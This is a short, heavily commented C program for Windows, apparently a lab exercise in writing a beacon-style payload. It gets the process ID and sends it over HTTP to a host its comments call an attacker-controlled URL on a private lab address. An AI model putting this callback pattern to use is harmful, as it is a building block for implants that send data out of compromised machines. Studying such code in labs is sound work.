#include <windows.h>    // For Windows API functions like GetCurrentProcessId()
#include <wininet.h>    // For Internet functions: InternetOpen, InternetOpenUrl, etc.
#include <stdio.h>

#pragma comment(lib, "wininet.lib")  // Link with WinINet library at compile time

int main() {
    // Step 1: Get the current process ID
    DWORD pid = GetCurrentProcessId(); // Returns the PID of the running process

    // Step 2: Convert PID to a string like "pid=1234"
    char pid_str[32];
    sprintf(pid_str, "pid=%lu", pid);  // Store the PID as a string

    // Step 3: Initialize a WinINet session
    // "MyBOF" is a custom user-agent string
    // INTERNET_OPEN_TYPE_DIRECT: No proxy is used
    HINTERNET hInternet = InternetOpen("MyBOF", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

    if (hInternet) {
        // Step 4: Open a connection to the attacker's web server
        HINTERNET hConnect = InternetOpenUrl(
            hInternet,
            "http://192.168.56.30:9000",  // Attacker-controlled URL
            NULL,  // No custom headers
            0,     // Header length
            INTERNET_FLAG_RELOAD, // Force reload, skip cache
            0
        );

        if (hConnect) {
            // Step 5: Send the PID string to the server via HTTP
            InternetWriteFile(hConnect, pid_str, strlen(pid_str), NULL);

            // Step 6: Clean up the handle
            InternetCloseHandle(hConnect);
        }

        // Step 7: Close the internet session
        InternetCloseHandle(hInternet);
    }

    return 0;
}